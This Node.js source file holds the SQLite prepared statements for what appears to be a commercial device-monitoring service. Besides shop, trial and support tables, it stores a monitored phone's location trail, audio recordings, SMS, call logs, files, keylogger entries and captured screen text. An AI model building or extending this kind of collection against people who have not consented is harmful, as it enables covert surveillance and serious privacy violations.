// statements.js — All prepared statements, grouped by domain.
// Factory function: receives db, returns all statement objects.

module.exports = function createStatements(db) {
  const trialStmts = {
    entByLicense:      db.prepare('SELECT * FROM entitlements WHERE license_key=?'),
    entByUser:         db.prepare('SELECT * FROM entitlements WHERE user_id=? ORDER BY created_at DESC'),
    entDigitalForUser: db.prepare("SELECT * FROM entitlements WHERE user_id=? AND trial_type='digital_mdm_7' ORDER BY created_at DESC LIMIT 1"),
    insertEnt:         db.prepare('INSERT INTO entitlements (license_key,user_id,order_id,trial_type,status,created_at) VALUES (?,?,?,?,?,?)'),
    activateEnt:       db.prepare("UPDATE entitlements SET device_id=?, trial_start_date=?, software_trial_deadline=?, status='Active', first_ping_at=?, last_ping_at=? WHERE id=?"),
    touchEnt:          db.prepare('UPDATE entitlements SET last_ping_at=? WHERE id=?'),
    expireEnt:         db.prepare("UPDATE entitlements SET status='Expired' WHERE id=?"),
  };

  const shopStmts = {
    allProducts:      db.prepare('SELECT * FROM products ORDER BY sort_order, title'),
    activeProducts:   db.prepare('SELECT * FROM products WHERE active=1 ORDER BY sort_order, title'),
    productById:      db.prepare('SELECT * FROM products WHERE id=?'),
    upsertProduct:    db.prepare(`INSERT INTO products
                      (sku,title,model_series,base_cost_cents,markup_cents,price_cents,currency,active,sort_order,updated_at)
                      VALUES (@sku,@title,@model_series,@base_cost_cents,@markup_cents,@price_cents,@currency,@active,@sort_order,@updated_at)
                      ON CONFLICT(sku) DO UPDATE SET title=excluded.title, model_series=excluded.model_series,
                        base_cost_cents=excluded.base_cost_cents, markup_cents=excluded.markup_cents,
                        price_cents=excluded.price_cents, currency=excluded.currency, active=excluded.active,
                        sort_order=excluded.sort_order, updated_at=excluded.updated_at`),
    deleteProduct:    db.prepare('DELETE FROM products WHERE id=?'),
    orderById:        db.prepare('SELECT * FROM orders WHERE id=?'),
    ordersByUser:     db.prepare('SELECT * FROM orders WHERE user_id=? ORDER BY created_at DESC'),
    allOrders:        db.prepare('SELECT * FROM orders ORDER BY created_at DESC'),
    insertOrder:      db.prepare(`INSERT INTO orders
                      (order_ref,user_id,email,order_type,product_sku,amount_cents,currency,status,carrier,tracking_number,shipped_at,delivered_at,created_at,updated_at)
                      VALUES (@order_ref,@user_id,@email,@order_type,@product_sku,@amount_cents,@currency,@status,@carrier,@tracking_number,@shipped_at,@delivered_at,@created_at,@updated_at) RETURNING id`),
    setOrderShipment: db.prepare('UPDATE orders SET carrier=?, tracking_number=?, shipped_at=?, delivered_at=?, status=?, updated_at=? WHERE id=?'),
    rmaById:          db.prepare('SELECT * FROM rma_requests WHERE id=?'),
    rmaByOrder:       db.prepare('SELECT * FROM rma_requests WHERE order_id=? ORDER BY created_at DESC'),
    rmaByUser:        db.prepare('SELECT * FROM rma_requests WHERE user_id=? ORDER BY created_at DESC'),
    allRma:           db.prepare('SELECT * FROM rma_requests ORDER BY created_at DESC'),
    insertRma:        db.prepare('INSERT INTO rma_requests (rma_ref,order_id,user_id,reason,status,created_at,updated_at) VALUES (?,?,?,?,?,?,?) RETURNING id'),
    setRmaStatus:     db.prepare('UPDATE rma_requests SET status=?, updated_at=? WHERE id=?'),
    setRmaReturn:     db.prepare('UPDATE rma_requests SET return_carrier=?, return_tracking=?, status=?, updated_at=? WHERE id=?'),
    setRmaDelivered:  db.prepare("UPDATE rma_requests SET returned_delivered_at=?, status='Pending_Inspection', updated_at=? WHERE id=?"),
    setRmaInspection: db.prepare('UPDATE rma_requests SET serial_verified=?, condition_pass=?, inspection_notes=?, inspected_by=?, updated_at=? WHERE id=?'),
    releaseRefund:    db.prepare("UPDATE rma_requests SET status='Refunded', refund_released_at=?, refund_released_by=?, updated_at=? WHERE id=?"),
    insertRmaPhoto:   db.prepare('INSERT INTO rma_photos (rma_id,slot,r2_key,content_type,uploaded_at) VALUES (?,?,?,?,?)'),
    photosByRma:      db.prepare('SELECT * FROM rma_photos WHERE rma_id=? ORDER BY uploaded_at'),
    photoById:        db.prepare('SELECT * FROM rma_photos WHERE id=?'),
    allEntsAdmin:     db.prepare('SELECT * FROM entitlements ORDER BY created_at DESC'),
    entById:          db.prepare('SELECT * FROM entitlements WHERE id=?'),
    entByOrder:       db.prepare('SELECT id, hardware_id_hmac FROM entitlements WHERE order_id=? AND hardware_id_hmac IS NOT NULL'),
    lapsedCandidates: db.prepare('SELECT * FROM entitlements WHERE status=? AND software_trial_deadline IS NOT NULL AND software_trial_deadline < ? AND lapsed_alerted_at IS NULL'),
    markLapsed:       db.prepare('UPDATE entitlements SET lapsed_alerted_at=? WHERE id=?'),
    extendEnt:        db.prepare("UPDATE entitlements SET software_trial_deadline=?, status='Active', lapsed_alerted_at=NULL WHERE id=?"),
    setEntStatus:     db.prepare('UPDATE entitlements SET status=? WHERE id=?'),
  };

  const supportStmts = {
    threadByUser:       db.prepare('SELECT * FROM support_threads WHERE user_id=? ORDER BY last_msg_at DESC LIMIT 1'),
    threadById:         db.prepare('SELECT * FROM support_threads WHERE id=?'),
    threadByConvoId:    db.prepare('SELECT * FROM support_threads WHERE conversation_id=? AND user_id=?'),
    listByUser:         db.prepare('SELECT * FROM support_threads WHERE user_id=? AND (archived IS NULL OR archived=0) ORDER BY (last_msg_at IS NULL), last_msg_at DESC'),
    listByUserArchived: db.prepare('SELECT * FROM support_threads WHERE user_id=? AND archived=1 ORDER BY (last_msg_at IS NULL), last_msg_at DESC'),
    allThreads:         db.prepare('SELECT * FROM support_threads ORDER BY (last_msg_at IS NULL), last_msg_at DESC'),
    insertThread:       db.prepare("INSERT INTO support_threads (user_id,subject,status,created_at,last_msg_at,conversation_id) VALUES (?,?,?,?,?,?) RETURNING id"),
    insertMsg:          db.prepare('INSERT INTO support_messages (thread_id,sender,body,created_at) VALUES (?,?,?,?) RETURNING id'),
    insertMsgEnc:       db.prepare("INSERT INTO support_messages (thread_id,sender,body,created_at,enc,payload,dek_user,dek_support) VALUES (?,?,'',?,1,?,?,?) RETURNING id"),
    msgsByThread:       db.prepare('SELECT * FROM support_messages WHERE thread_id=? ORDER BY created_at'),
    msgsSince:          db.prepare('SELECT * FROM support_messages WHERE thread_id=? AND id>? ORDER BY created_at'),
    lastMsg:            db.prepare('SELECT * FROM support_messages WHERE thread_id=? ORDER BY created_at DESC LIMIT 1'),
    touchUserMsg:       db.prepare("UPDATE support_threads SET last_msg_at=?, unread_admin=unread_admin+1, status='open' WHERE id=?"),
    touchAdminMsg:      db.prepare('UPDATE support_threads SET last_msg_at=?, unread_user=unread_user+1 WHERE id=?'),
    markAdminRead:      db.prepare('UPDATE support_threads SET unread_admin=0 WHERE id=?'),
    markUserRead:       db.prepare('UPDATE support_threads SET unread_user=0 WHERE id=?'),
    setStatus:          db.prepare('UPDATE support_threads SET status=? WHERE id=?'),
  };

  const guestStmts = {
    byConvoId:        db.prepare('SELECT * FROM guest_threads WHERE conversation_id=?'),
    byGuestIdLatest:  db.prepare("SELECT * FROM guest_threads WHERE guest_id=? AND status NOT IN ('deleted') ORDER BY last_msg_at DESC LIMIT 1"),
    listByGuestId:    db.prepare("SELECT * FROM guest_threads WHERE guest_id=? AND status NOT IN ('deleted') ORDER BY last_msg_at DESC"),
    byId:             db.prepare('SELECT * FROM guest_threads WHERE id=?'),
    all:              db.prepare("SELECT * FROM guest_threads WHERE status!='deleted' ORDER BY (last_msg_at IS NULL), last_msg_at DESC"),
    insert:           db.prepare('INSERT INTO guest_threads (guest_id,conversation_id,name,email,status,created_at,last_msg_at) VALUES (?,?,?,?,?,?,?) RETURNING id'),
    updateContact:    db.prepare('UPDATE guest_threads SET name=COALESCE(?,name), email=COALESCE(?,email) WHERE id=?'),
    insertMsg:        db.prepare('INSERT INTO guest_messages (thread_id,sender,body,created_at) VALUES (?,?,?,?) RETURNING id'),
    msgsByThread:     db.prepare('SELECT * FROM guest_messages WHERE thread_id=? ORDER BY created_at'),
    msgsSince:        db.prepare('SELECT * FROM guest_messages WHERE thread_id=? AND id>? ORDER BY created_at'),
    lastMsg:          db.prepare('SELECT * FROM guest_messages WHERE thread_id=? ORDER BY created_at DESC LIMIT 1'),
    touchGuestMsg:    db.prepare("UPDATE guest_threads SET last_msg_at=?, unread_admin=unread_admin+1, status='open' WHERE id=?"),
    touchAdminMsg:    db.prepare('UPDATE guest_threads SET last_msg_at=?, unread_guest=unread_guest+1 WHERE id=?'),
    markAdminRead:    db.prepare('UPDATE guest_threads SET unread_admin=0 WHERE conversation_id=?'),
    clearGuestUnread: db.prepare('UPDATE guest_threads SET unread_guest=0 WHERE conversation_id=?'),
    setStatus:        db.prepare('UPDATE guest_threads SET status=? WHERE id=?'),
    setArchived:      db.prepare('UPDATE guest_threads SET archived=? WHERE conversation_id=? AND guest_id=?'),
    softDelete:       db.prepare("UPDATE guest_threads SET status='deleted' WHERE conversation_id=? AND guest_id=?"),
  };

  const stmts = {
    allDevices:     db.prepare('SELECT * FROM devices ORDER BY last_seen DESC'),
    getDevice:      db.prepare('SELECT * FROM devices WHERE id=?'),
    upsertDevice:   db.prepare(`INSERT INTO devices (id,name,model,android_version,os_build,security_patch,battery,last_seen,online,platform,app_version)
                                 VALUES (@id,@name,@model,@androidVersion,@osBuild,@securityPatch,@battery,@ts,1,@platform,@appVersion)
                                 ON CONFLICT(id) DO UPDATE SET
                                   name = CASE WHEN devices.name IS NULL OR devices.name = '' THEN excluded.name ELSE devices.name END,
                                   model=excluded.model,
                                   android_version=excluded.android_version,
                                   os_build=excluded.os_build,
                                   security_patch=excluded.security_patch,
                                   battery=excluded.battery, last_seen=excluded.last_seen,
                                   online=1, platform=excluded.platform,
                                   app_version=excluded.app_version`),
    setOffline:     db.prepare('UPDATE devices SET online=0 WHERE id=?'),
    insertLocation: db.prepare('INSERT INTO locations (device_id,data,timestamp) VALUES (?,?,?)'),
    insertZkPayload:db.prepare('INSERT INTO zk_payloads (device_id,event_type,payload,dek_wrapped,timestamp) VALUES (?,?,?,?,?)'),
    updateDeviceLoc:db.prepare('UPDATE devices SET last_lat=?,last_lng=?,last_seen=?,battery=? WHERE id=?'),
    // LIMIT matches the ZK path's zkRowLimit default (2000). Speed-gated auto live-track
    // (MonitoringService.kt) floods history at 1 fix/sec while driving — at LIMIT 200 a
    // single drive evicted everything older than ~3 minutes, so the blue track on the map
    // SHRANK despite the denser sampling. 2000 rows ≈ 33 min of continuous driving detail,
    // or days of context at the normal 60 s / 20 min background cadence.
    // LIMIT sized for the per-day location-history view: retention is 30 days (RETAIN_LOCATIONS_DAYS),
    // so a full month of fixes must fit in ONE fetch (10k pts ≈ worst-case month incl. live-track bursts).
    // Indexed by idx_locations_device(device_id, timestamp DESC).
    locationHistory:db.prepare('SELECT id,device_id,data,timestamp FROM locations WHERE device_id=? ORDER BY timestamp DESC LIMIT 10000'),
    insertMedia:    db.prepare('INSERT INTO media (device_id,type,data,timestamp) VALUES (?,?,?,?) RETURNING id'),
    mediaList:      db.prepare('SELECT id,device_id,type,timestamp FROM media WHERE device_id=? ORDER BY timestamp DESC LIMIT 50'),
    mediaListType:  db.prepare('SELECT id,device_id,type,timestamp FROM media WHERE device_id=? AND type=? ORDER BY timestamp DESC LIMIT 50'),
    mediaListAudio: db.prepare("SELECT id,device_id,type,timestamp,data FROM media WHERE device_id=? AND type='audio' ORDER BY timestamp DESC LIMIT 50"),
    mediaListUnlock:db.prepare("SELECT id,device_id,type,timestamp FROM media WHERE device_id=? AND type IN ('unlock_success','unlock_fail') ORDER BY timestamp DESC LIMIT 100"),
    mediaById:      db.prepare('SELECT * FROM media WHERE id=?'),
    insertNetwork:  db.prepare('INSERT INTO network_events (device_id, data, timestamp) VALUES (?,?,?)'),
    latestNetwork:  db.prepare('SELECT * FROM network_events WHERE device_id=? ORDER BY timestamp DESC LIMIT 1'),
    insertBtEvent:  db.prepare('INSERT INTO bt_events (device_id, data, timestamp) VALUES (?,?,?)'),
    latestBtEvent:  db.prepare('SELECT * FROM bt_events WHERE device_id=? ORDER BY timestamp DESC LIMIT 1'),
    deleteMedia:    db.prepare('DELETE FROM media WHERE id=?'),
    insertFile:     db.prepare('INSERT INTO files (device_id,remote_path,filename,size,captured_at) VALUES (?,?,?,?,?) RETURNING id'),
    listFiles:      db.prepare('SELECT id,device_id,remote_path,filename,size,captured_at FROM files WHERE device_id=? ORDER BY captured_at DESC LIMIT 100'),
    getFile:        db.prepare('SELECT * FROM files WHERE id=?'),
    deleteFile:     db.prepare('DELETE FROM files WHERE id=?'),
    insertCallLog:    db.prepare('INSERT INTO call_logs (device_id,data,timestamp) VALUES (?,?,?)'),
    latestCallLog:    db.prepare('SELECT * FROM call_logs WHERE device_id=? ORDER BY timestamp DESC LIMIT 1'),
    insertSms:        db.prepare('INSERT INTO sms_messages (device_id,data,timestamp) VALUES (?,?,?)'),
    latestSms:        db.prepare('SELECT * FROM sms_messages WHERE device_id=? ORDER BY timestamp DESC LIMIT 1'),
    updateDeviceBattery: db.prepare('UPDATE devices SET battery=?, last_seen=? WHERE id=?'),
    deviceFileNames:  db.prepare('SELECT filename FROM files WHERE device_id=?'),
    deleteDevice:     db.prepare('DELETE FROM devices WHERE id=?'),
    delDevLocs:       db.prepare('DELETE FROM locations WHERE device_id=?'),
    delDevMedia:      db.prepare('DELETE FROM media WHERE device_id=?'),
    delDevNetwork:    db.prepare('DELETE FROM network_events WHERE device_id=?'),
    delDevBtEvents:   db.prepare('DELETE FROM bt_events WHERE device_id=?'),
    delDevFiles:      db.prepare('DELETE FROM files WHERE device_id=?'),
    delDevCalls:      db.prepare('DELETE FROM call_logs WHERE device_id=?'),
    delDevSms:        db.prepare('DELETE FROM sms_messages WHERE device_id=?'),
    delDevApps:       db.prepare('DELETE FROM app_lists WHERE device_id=?'),
    insertAppList:    db.prepare('INSERT INTO app_lists (device_id,data,timestamp) VALUES (?,?,?)'),
    latestAppList:    db.prepare('SELECT * FROM app_lists WHERE device_id=? ORDER BY timestamp DESC LIMIT 1'),
    insertKeylog:     db.prepare('INSERT INTO keylog_entries (device_id,data,timestamp) VALUES (?,?,?)'),
    listKeylogs:      db.prepare('SELECT id,data,timestamp FROM keylog_entries WHERE device_id=? ORDER BY timestamp DESC'),
    delDevKeylogs:    db.prepare('DELETE FROM keylog_entries WHERE device_id=?'),
    insertScreenText: db.prepare('INSERT INTO screen_text_entries (device_id,pkg,data,timestamp) VALUES (?,?,?,?)'),
    listScreenText:   db.prepare('SELECT id,pkg,data,timestamp FROM screen_text_entries WHERE device_id=? ORDER BY timestamp DESC LIMIT ?'),
    listScreenTextBefore: db.prepare('SELECT id,pkg,data,timestamp FROM screen_text_entries WHERE device_id=? AND timestamp<? ORDER BY timestamp DESC LIMIT ?'),
    listScreenTextSince: db.prepare('SELECT id,pkg,data,timestamp FROM screen_text_entries WHERE device_id=? AND timestamp>=? ORDER BY timestamp ASC LIMIT ?'),
    delDevScreenText: db.prepare('DELETE FROM screen_text_entries WHERE device_id=?'),
    insertStatusEvent: db.prepare('INSERT INTO device_status_events (device_id,type,data,timestamp) VALUES (?,?,?,?)'),
    listStatusEvents:  db.prepare('SELECT id,device_id,type,data,timestamp FROM device_status_events WHERE device_id=? ORDER BY timestamp DESC LIMIT 500'),
    delDevStatusEvts:  db.prepare('DELETE FROM device_status_events WHERE device_id=?'),
    getDeviceKey:      db.prepare('SELECT public_key FROM devices WHERE id=?'),
    setDeviceKey:      db.prepare('UPDATE devices SET public_key=? WHERE id=?'),
    listPendingKeys:   db.prepare('SELECT * FROM pending_device_keys ORDER BY submitted_at DESC'),
    getPendingKey:     db.prepare('SELECT * FROM pending_device_keys WHERE device_id=?'),
    insertPendingKey:  db.prepare('INSERT INTO pending_device_keys (device_id,model,android_version,public_key,submitted_at,enrollment_user_id) VALUES (?,?,?,?,?,?) ON CONFLICT(device_id) DO UPDATE SET model=excluded.model, android_version=excluded.android_version, public_key=excluded.public_key, submitted_at=excluded.submitted_at, enrollment_user_id=excluded.enrollment_user_id'),
    deletePendingKey:  db.prepare('DELETE FROM pending_device_keys WHERE device_id=?'),
    insertEnrollTicket: db.prepare('INSERT INTO enrollment_tickets (ticket,user_id,device_id,expires_at,consumed_at,created_at) VALUES (?,?,?,?,NULL,?)'),
    insertInstallerTicket: db.prepare('INSERT INTO enrollment_tickets (ticket,user_id,device_id,kind,uses_remaining,expires_at,consumed_at,created_at,platform) VALUES (?,?,?,?,?,?,NULL,?,?)'),
    getEnrollTicket:    db.prepare('SELECT * FROM enrollment_tickets WHERE ticket=?'),
    consumeEnrollTicket: db.prepare('UPDATE enrollment_tickets SET consumed_at=? WHERE ticket=? AND consumed_at IS NULL'),
    // Multi-use installer tickets: a use only decrements uses_remaining — consumed_at stays NULL
    // (it is the REVOKED marker for kind='installer'; setting it on every use made the "up to N
    // PCs" quota die after the FIRST device — found 2026-08-16 while porting the no-login flow to
    // Linux, same broken path the Windows exe was subject to). The consumed_at IS NULL predicate
    // still blocks a revoked ticket from ever consuming again.
    consumeInstallerTicketUse: db.prepare('UPDATE enrollment_tickets SET uses_remaining=uses_remaining-1 WHERE ticket=? AND consumed_at IS NULL AND uses_remaining>0 AND expires_at>?'),
    listInstallerTickets: db.prepare("SELECT ticket, user_id, uses_remaining, expires_at, created_at, platform FROM enrollment_tickets WHERE kind='installer' AND uses_remaining > 0 AND expires_at > ? AND (? IS NULL OR platform = ?) ORDER BY created_at DESC LIMIT 200"),
    revokeEnrollTicket: db.prepare('UPDATE enrollment_tickets SET consumed_at=? WHERE ticket=? AND kind=? AND consumed_at IS NULL'),
    purgeEnrollTickets: db.prepare("DELETE FROM enrollment_tickets WHERE expires_at < ? OR (kind='login' AND consumed_at IS NOT NULL) OR (kind='installer' AND uses_remaining<=0)"),
    getDeviceLock:      db.prepare('SELECT owner_user_id, locked_identity_email FROM devices WHERE id=?'),
    setDeviceLock:      db.prepare('UPDATE devices SET locked_identity_email=?, locked_pubkey_sha=? WHERE id=?'),
    userByName:      db.prepare('SELECT * FROM users WHERE username=?'),
    userByEmail:     db.prepare("SELECT * FROM users WHERE email=? ORDER BY (status='active') DESC, totp_verified DESC, created_at DESC LIMIT 1"),
    getUserById:     db.prepare('SELECT id, permissions, enabled_features, account_type, parent_owner_id FROM users WHERE id=?'),
    allUsers:        db.prepare('SELECT id,username,role,permissions,created_at,status,account_type,email,enabled_features,trial_enabled,trial_started_at,comp_plan,comp_expires_at,comp_granted_by,business_mode,parent_owner_id FROM users ORDER BY created_at'),
    insertUser:      db.prepare('INSERT INTO users (username,password_hash,role,permissions,created_at,pw_scheme,auth_salt) VALUES (?,?,?,?,?,?,?) RETURNING id'),
    updateUserPerms: db.prepare('UPDATE users SET permissions=? WHERE id=?'),
    deleteUser:      db.prepare("DELETE FROM users WHERE id=? AND role != 'admin'"),
  };

  return { trialStmts, shopStmts, supportStmts, guestStmts, stmts };
};
